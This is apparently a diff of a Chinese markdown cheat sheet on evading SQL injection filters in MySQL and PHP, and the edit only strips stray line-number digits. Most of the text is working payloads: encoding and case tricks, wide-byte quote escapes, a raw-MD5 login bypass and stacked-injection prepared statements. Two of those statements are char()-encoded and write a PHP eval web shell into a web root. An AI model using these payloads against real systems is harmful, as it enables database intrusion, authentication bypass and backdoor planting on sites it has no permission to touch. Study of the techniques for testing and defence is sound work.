@@ -5,7 +5,6 @@
 # 注释内容
 /*注释内容*/
 ;
-1234
 ```
 
 ## 2.大小写绕过
@@ -15,7 +14,6 @@
 ```bash
 UniOn 
 SeleCt
-12
 ```
 
 ## 3.内联注释绕过
@@ -24,7 +22,6 @@ SeleCt
 
 ```bash
  select * from cms_users where userid=1 union /*!select*/ 1,2,3;
-1
 ```
 
 ## 4.双写绕过
@@ -39,14 +36,12 @@ SeleCt
 ```bash
 1+and+1=2
 1+%25%36%31%25%36%65%25%36%34+1=2 
-12
 ```
 
 **ascii编码绕过**
 
 ```bash
 Test 等价于CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)
-1
 ```
 
 **16进制绕过：**
@@ -54,7 +49,6 @@ Test 等价于CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)
 ```bash
 select * from users where username = test1;
 select * from users where username = 0x7465737431;
-12
 ```
 
 **unicode编码对部分符号的绕过：**
@@ -64,7 +58,6 @@ select * from users where username = 0x7465737431;
 空格=> %u0020 %uff00
 左括号=> %u0028 %uff08
 右括号=> %u0029 %uff09
-1234
 ```
 
 ## 6.<>大于小于号绕过
@@ -74,7 +67,6 @@ greatest(n1, n2, n3…):返回n中的最大值 或least(n1,n2,n3…):返回n中�
 
 ```bash
 select * from cms_users where userid=1 and greatest(ascii(substr(database(),1,1)),1)=99;
-1
 ```
 
 strcmp(str1,str2):
@@ -82,21 +74,18 @@ strcmp(str1,str2):
 
 ```bash
 select * from cms_users where userid=1 and strcmp(ascii(substr(database(),0,1)),99);
-1
 ```
 
 in关键字
 
 ```bash
 select * from cms_users where userid=1 and substr(database(),1,1) in ('c');
-1
 ```
 
 between a and b:范围在a-b之间（不包含b）
 
 ```bash
 select * from cms_users where userid=1 and substr(database(),1,1) between 'a' and 'd';
-1
 ```
 
 ## 7.空格绕过
@@ -110,7 +99,6 @@ select * from cms_users where userid=1 and substr(database(),1,1) between 'a' an
 `(tab键上面的按钮)
 tab
 两个空格
-123456
 ```
 
 8.对or and xor not 绕过
@@ -120,7 +108,6 @@ or = ||
 and = &&
 xor = | 或者 ^ # 异或,例如Select * from cms_users where userid=1^sleep(5);
 not = !
-1234
 ```
 
 ## 9.对等号=绕过
@@ -130,35 +117,30 @@ not = !
 
 ```bash
  Select * from cms_users where username like "ad%";
-1
 ```
 
 不加上通配符的like可以用来取代=：
 
 ```bash
  Select * from cms_users where username like "admin";
-1
 ```
 
 regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配
 
 ```bash
 Select * from cms_users where username REGEXP "admin";
-1
 ```
 
 使用大小于号来绕过
 
 ```bash
 Select * from cms_users where userid>0 and userid<2;
-1
 ```
 
 <> 等价于 != ,所以在前面再加一个 ! 结果就是等号了
 
 ```bash
 Select * from cms_users where !(username <> "admin");
-1
 ```
 
 ## 10.对单引号的绕过
@@ -168,7 +150,6 @@ Select * from cms_users where !(username <> "admin");
 
 ```bash
 select column_name  from information_schema.tables where table_name="users"
-1
 ```
 
 这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
@@ -176,7 +157,6 @@ select column_name  from information_schema.tables where table_name="users"
 
 ```bash
 select column_name  from information_schema.tables where table_name=0x7573657273
-1
 ```
 
 宽字节
@@ -186,7 +166,6 @@ select column_name  from information_schema.tables where table_name=0x7573657273
 
 ```bash
 id=-1%df%27union select 1,user(),3--+
-1
 ```
 
 （2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。
@@ -226,7 +205,6 @@ char(ascii_int):和ascii()的作用相反，将ascii码转字符
 
 ```bash
  select substr(database() from 1 for 1)='c';
-1
 ```
 
 ##### 使用join关键字来绕过
@@ -235,7 +213,6 @@ char(ascii_int):和ascii()的作用相反，将ascii码转字符
 union select 1,2,3,4;
 union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);
 union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);
-123
 ```
 
 ##### 使用like关键字 适用于substr()等提取子串的函数中的逗号
@@ -243,7 +220,6 @@ union select * from ((select 1)A join (select 2)B join (select 3)C join (select 
 ```bash
 select ascii(mid(user(),1,1))=80   #等价于
 select user() like 'r%'
-12
 ```
 
 ##### 使用offset关键字
@@ -252,7 +228,6 @@ select user() like 'r%'
  select * from cms_users limit 0,1;
 # 等价于下面这条SQL语句
  select * from cms_users limit 1 offset 0;
-123
 ```
 
 ## 12.过滤函数绕过
@@ -281,7 +256,6 @@ IFNULL函数
 select ifnull(substr(database(),1,1)='c',0);
 case when then函数
 select case substr(database(),1,1)='c' when 1 then 1 else 0 end;
-123456
 ```
 
 ## 13堆叠注入时利用 MySql 预处理
@@ -298,7 +272,6 @@ SET：用于设置变量(@a)
 
 ```bash
 1';sEt @a=concat("sel","ect flag from flag_here");PRepare hello from @a;execute hello;#
-1
 ```
 
 这里还用大小写简单绕了一下其他过滤
@@ -334,14 +307,12 @@ mysql> execute test;
 | test               |
 +--------------------+
 6 rows in set (0.02 sec)
-123456789101112131415161718192021222324252627
 ```
 
 即payload类似如下：
 
 ```bash
 1';sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#
-1
 ```
 
 MySql预处理配合字符串拼接绕过关键字
@@ -349,14 +320,12 @@ MySql预处理配合字符串拼接绕过关键字
 
 ```bash
 set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;
-1
 ```
 
 也可以不用concat函数，直接用char函数也具有连接功能：
 
 ```bash
 set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;
-1
 ```
 
 ## 14’".md5($pass,true)."’ 登录绕过
@@ -365,7 +334,6 @@ set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,4
 
 ```bash
 SELECT * FROM users WHERE password = '.md5($password,true).';
-1
 ```
 
 md5(string,true) 函数在指定了true的时候，是返回的原始 16 字符二进制格式，也就是说会返回这样子的字符串：'or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c：
@@ -396,7 +364,6 @@ content: 129581926211651571912466741651878684928
 hex: 06da5430449f8f6f23dfc1276f722738
 raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8
 string: T0Do#'or'8
-12345
 ```
 
 ## 附录 PHP中一些常见的过滤方法及绕过方式
@@ -461,7 +428,6 @@ php代码   preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr
 php代码   preg_match('/(and|or|union|where)/i',$id)
 会过滤的攻击代码    1 || (select user from users where user_id = 1) = 'admin'
 绕过方式    1 || (select user from users limit 1) = 'admin'
-1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859
 ```
 
 参考资料：
@@ -470,7 +436,6 @@ php代码   preg_match('/(and|or|union|where)/i',$id)
  https://mp.weixin.qq.com/s?__biz=MzI4MDQ5MjY1Mg==&mid=2247492453&idx=1&sn=7fa30af26e4d7cfa16792e4f62ba730d&chksm=ebb50c66dcc285703481d990db26fab029b86b9c0c63ea18f11f86cdcbf2be59d82760d2f994&mpshare=1&scene=1&srcid=1212Bxs6l9sTEGEe0tbr0ApF&sharer_sharetime=1639528636326&sharer_shareid=d958928af57914a769de8e2e72622d10&version=3.1.2.2211&platform=win#rd
  
  https://blog.csdn.net/anlalu233/article/details/102623256
- 123
 ```
 
 
